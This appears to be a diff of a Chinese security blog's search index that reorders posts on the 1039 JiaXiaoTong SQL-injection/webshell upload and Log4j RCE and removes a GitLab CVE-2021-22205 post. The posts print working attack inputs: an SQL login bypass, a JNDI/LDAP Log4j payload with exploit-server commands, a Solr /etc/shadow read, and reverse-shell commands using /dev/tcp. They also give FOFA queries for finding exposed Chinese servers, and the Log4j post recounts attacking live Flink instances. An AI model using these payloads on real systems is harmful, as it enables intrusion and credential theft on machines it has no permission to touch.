@@ -1,72 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>【1039家校通】SQL注入和后台GETSHELL</title>
-    <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
-<a id="more"></a>
-
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>家校通v1.0 - v.6.0</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h4><p>登录接口</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;Comstye.aspx
-&#x2F;Student&#x2F;StudentLogin.aspx
-&#x2F;Teacher&#x2F;Index.aspx
-&#x2F;admin&#x2F;login.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/1.png" alt="图片"><br>用户名密码均输入</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39; or &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>可进入后台<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/2.png" alt="图片"><br>登陆后可任意修改网站内容<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/3.png" alt="图片"></p>
-<h4 id="上传点存在SQL注入"><a href="#上传点存在SQL注入" class="headerlink" title="上传点存在SQL注入"></a>上传点存在SQL注入</h4><h5 id="教练登录手机端存在SQL注入"><a href="#教练登录手机端存在SQL注入" class="headerlink" title="教练登录手机端存在SQL注入"></a>教练登录手机端存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;teacherphone&#x2F;teacherlogin.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/8.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/9.png" alt="图片"></p>
-<h5 id="教练点评处存在SQL注入"><a href="#教练点评处存在SQL注入" class="headerlink" title="教练点评处存在SQL注入"></a>教练点评处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;Teacher&#x2F;TeacherPf.aspx?yid&#x3D;0030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/10.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/11.png" alt="图片"></p>
-<h5 id="管理员后台增加分类处存在SQL注入"><a href="#管理员后台增加分类处存在SQL注入" class="headerlink" title="管理员后台增加分类处存在SQL注入"></a>管理员后台增加分类处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;comstye2.aspx
-&#x2F;admin&#x2F;yk&#x2F;Index.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/13.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/12.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/14.png" alt="图片"></p>
-<h4 id="后台管理编辑器任意文件上传"><a href="#后台管理编辑器任意文件上传" class="headerlink" title="后台管理编辑器任意文件上传"></a>后台管理编辑器任意文件上传</h4><p>在后台选择产品分类模块，再点击上传图片<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/4.png" alt="图片"><br>Burp抓包重放数据模块，上传一个asp的大马，上传成功可以看到上传的地址<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/5.png" alt="图片"><br>访问路径，getshell<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/6.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/7.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>及时联系技术厂家对系统进行升级维护或打补丁</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://p1kaju.github.io/research/1039-HomeSchool-security-research/">https://p1kaju.github.io/research/1039-HomeSchool-security-research/</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2014.7</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【CNVD-2021-95914/CVE-2021-44228】Apache Log4j RCE漏洞</title>
-    <url>/2021/12/10/Apache%20Log4j%20RCE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>昨晚我正要去睡觉的时候，突然收到了好几个群消息，赶忙看了一下，发现是阿里云安全团队披露了一个Apache Log4j的0day，其实早在11月阿里云就已经向Apache官方提交了报告。</p>
-<p>Apache Log4j2是一款优秀的Java日志框架。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
-<p>因为Log4j这个框架利用的过于广泛，此漏洞一出，各大厂商纷纷中枪，一时间安全圈陷入了RCE的腥风血雨中，估计好多人都是一夜未眠~~</p>
-<a id="more"></a>
-
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Log4j 2.x &lt;= 2.14.1<br>Apache Struts2<br>Apache Solr<br>Apache Druid<br>Apache Flink</p>
-<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>漏洞等级：10 | 严重</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h4><p>先设置本地端口的监听</p>
-<pre class="line-numbers language-none"><code class="language-none">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i [ip]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheLog4jRCE/6.png" alt="图片"><br>用idea打开项目，替换自己的ip，build打包<br><img src="/images/ApacheLog4jRCE/7.png" alt="图片"><br>打包完会出现一个out文件夹，在这里输入如下指令，弹计算器</p>
-<pre class="line-numbers language-none"><code class="language-none">java -Dcom.sun.jndi.ldap.object.trustURLCodebase&#x3D;true -jar Log4j-rce.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheLog4jRCE/8.png" alt="图片"></p>
-<h4 id="实战复现"><a href="#实战复现" class="headerlink" title="实战复现"></a>实战复现</h4><p>因为大部分Apache的服务都存在这个漏洞，我就先找了一个Apache Flink平台<br>fofa语句：</p>
-<pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;APACHE-flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheLog4jRCE/1.png" alt="图片"><br>找一下输入框，然后放上payload，用自己的dnslog地址</p>
-<pre class="line-numbers language-none"><code class="language-none">$&#123;jndi:ldap:&#x2F;&#x2F;xxxxxx.dnslog.cn&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/ApacheLog4jRCE/2.png" alt="图片"><br>查看dnslog平台<br><img src="/images/ApacheLog4jRCE/3.png" alt="图片"><br>这个漏洞利用就是这么简单，后面我又测试了其他Apache服务，基本都成功了<br><img src="/images/ApacheLog4jRCE/4.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/5.png" alt="图片"></p>
-<h4 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h4><p>这个漏洞爆出来后，我的朋友圈就被刷屏了，在里面我还看到了一些挺有趣的骚操作，可以学习一下思路<br><img src="/images/ApacheLog4jRCE/11.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/10.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/9.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本<br>地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a><br>2.升级已知受影响的应用及组件，如srping-boot-strater-log4j2/Apache Solr/Apache Flink/Apache Druid</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/Yihsiwei/Log4j-exp">https://github.com/Yihsiwei/Log4j-exp</a><br><a href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a><br><a href="https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw">https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2021.12</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【Apache】Apache Solr任意文件读取漏洞复现</title>
     <url>/2021/05/05/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Solr&quot; || app&#x3D;&quot;&quot;Apache-Solr&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -236,6 +170,72 @@ stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow<span aria-hidden="true" c
       </tags>
   </entry>
   <entry>
+    <title>【1039家校通】SQL注入和后台GETSHELL</title>
+    <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
+<a id="more"></a>
+
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>家校通v1.0 - v.6.0</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h4><p>登录接口</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;Comstye.aspx
+&#x2F;Student&#x2F;StudentLogin.aspx
+&#x2F;Teacher&#x2F;Index.aspx
+&#x2F;admin&#x2F;login.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/1.png" alt="图片"><br>用户名密码均输入</p>
+<pre class="line-numbers language-none"><code class="language-none">&#39; or &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可进入后台<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/2.png" alt="图片"><br>登陆后可任意修改网站内容<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/3.png" alt="图片"></p>
+<h4 id="上传点存在SQL注入"><a href="#上传点存在SQL注入" class="headerlink" title="上传点存在SQL注入"></a>上传点存在SQL注入</h4><h5 id="教练登录手机端存在SQL注入"><a href="#教练登录手机端存在SQL注入" class="headerlink" title="教练登录手机端存在SQL注入"></a>教练登录手机端存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;teacherphone&#x2F;teacherlogin.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/8.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/9.png" alt="图片"></p>
+<h5 id="教练点评处存在SQL注入"><a href="#教练点评处存在SQL注入" class="headerlink" title="教练点评处存在SQL注入"></a>教练点评处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;Teacher&#x2F;TeacherPf.aspx?yid&#x3D;0030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/10.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/11.png" alt="图片"></p>
+<h5 id="管理员后台增加分类处存在SQL注入"><a href="#管理员后台增加分类处存在SQL注入" class="headerlink" title="管理员后台增加分类处存在SQL注入"></a>管理员后台增加分类处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;comstye2.aspx
+&#x2F;admin&#x2F;yk&#x2F;Index.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/13.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/12.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/14.png" alt="图片"></p>
+<h4 id="后台管理编辑器任意文件上传"><a href="#后台管理编辑器任意文件上传" class="headerlink" title="后台管理编辑器任意文件上传"></a>后台管理编辑器任意文件上传</h4><p>在后台选择产品分类模块，再点击上传图片<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/4.png" alt="图片"><br>Burp抓包重放数据模块，上传一个asp的大马，上传成功可以看到上传的地址<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/5.png" alt="图片"><br>访问路径，getshell<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/6.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/7.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>及时联系技术厂家对系统进行升级维护或打补丁</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://p1kaju.github.io/research/1039-HomeSchool-security-research/">https://p1kaju.github.io/research/1039-HomeSchool-security-research/</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2014.7</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【CNVD-2021-95914/CVE-2021-44228】Apache Log4j RCE漏洞</title>
+    <url>/2021/12/10/Apache%20Log4j%20RCE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>昨晚我正要去睡觉的时候，突然收到了好几个群消息，赶忙看了一下，发现是阿里云安全团队披露了一个Apache Log4j的0day，其实早在11月阿里云就已经向Apache官方提交了报告。</p>
+<p>Apache Log4j2是一款优秀的Java日志框架。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
+<p>因为Log4j这个框架利用的过于广泛，此漏洞一出，各大厂商纷纷中枪，一时间安全圈陷入了RCE的腥风血雨中，估计好多人都是一夜未眠~~</p>
+<a id="more"></a>
+
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Log4j 2.x &lt;= 2.14.1<br>Apache Struts2<br>Apache Solr<br>Apache Druid<br>Apache Flink</p>
+<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>漏洞等级：10 | 严重</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h4><p>先设置本地端口的监听</p>
+<pre class="line-numbers language-none"><code class="language-none">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i [ip]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/6.png" alt="图片"><br>用idea打开项目，替换自己的ip，build打包<br><img src="/images/ApacheLog4jRCE/7.png" alt="图片"><br>打包完会出现一个out文件夹，在这里输入如下指令，弹计算器</p>
+<pre class="line-numbers language-none"><code class="language-none">java -Dcom.sun.jndi.ldap.object.trustURLCodebase&#x3D;true -jar Log4j-rce.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/8.png" alt="图片"></p>
+<h4 id="实战复现"><a href="#实战复现" class="headerlink" title="实战复现"></a>实战复现</h4><p>因为大部分Apache的服务都存在这个漏洞，我就先找了一个Apache Flink平台<br>fofa语句：</p>
+<pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;APACHE-flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/1.png" alt="图片"><br>找一下输入框，然后放上payload，用自己的dnslog地址</p>
+<pre class="line-numbers language-none"><code class="language-none">$&#123;jndi:ldap:&#x2F;&#x2F;xxxxxx.dnslog.cn&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheLog4jRCE/2.png" alt="图片"><br>查看dnslog平台<br><img src="/images/ApacheLog4jRCE/3.png" alt="图片"><br>这个漏洞利用就是这么简单，后面我又测试了其他Apache服务，基本都成功了<br><img src="/images/ApacheLog4jRCE/4.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/5.png" alt="图片"></p>
+<h4 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h4><p>这个漏洞爆出来后，我的朋友圈就被刷屏了，在里面我还看到了一些挺有趣的骚操作，可以学习一下思路<br><img src="/images/ApacheLog4jRCE/11.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/10.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/9.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本<br>地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a><br>2.升级已知受影响的应用及组件，如srping-boot-strater-log4j2/Apache Solr/Apache Flink/Apache Druid</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/Yihsiwei/Log4j-exp">https://github.com/Yihsiwei/Log4j-exp</a><br><a href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a><br><a href="https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw">https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.12</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【CVE-2020-17519/17518】Apache Flink任意文件上传/读取漏洞复现</title>
     <url>/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Apache-Flink&quot;
@@ -294,44 +294,6 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
       </categories>
       <tags>
         <tag>2021.1</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【CVE-2021-22205】GitLab 远程命令执行漏洞复现</title>
-    <url>/2021/11/07/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;GitLab&quot;
-app&#x3D;&quot;GitLab&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<a id="more"></a>
-
-<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。<br>由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响。由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令。<br><strong>根本原因</strong><br>1.当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。<br>2.其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。</p>
-<p>Gitlab链接：<br><a href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/">https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/</a></p>
-<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：9.9 | 高危</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>11.9 &lt;= Gitlab CE/EE &lt; 13.8.8<br>12.13.9 &lt;= Gitlab CE/EE &lt; 13.9.6<br>13.13.10 &lt;= Gitlab CE/EE &lt; 13.10.3</p>
-<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p><a href="https://github.com/RedTeamWing/CVE-2021-22205">https://github.com/RedTeamWing/CVE-2021-22205</a><br><a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="证明存在"><a href="#证明存在" class="headerlink" title="证明存在"></a>证明存在</h4><p>先修改PoC里面的dnslog地址为自己的<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>利用PoC，我这里用的是pocsuite3测试框架<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>发现自己的dnslog有回显，证明利用成功，该站存在此漏洞<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
-<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里利用的是前面的第二个PoC</p>
-<pre class="line-numbers language-none"><code class="language-none">反弹shell：
-
-python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;
-这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下
-python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;
-这条语句意思是代表，对写入成功的sh脚本加执行权限
-python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;
-这条语句意思是代表，运行反弹shell脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
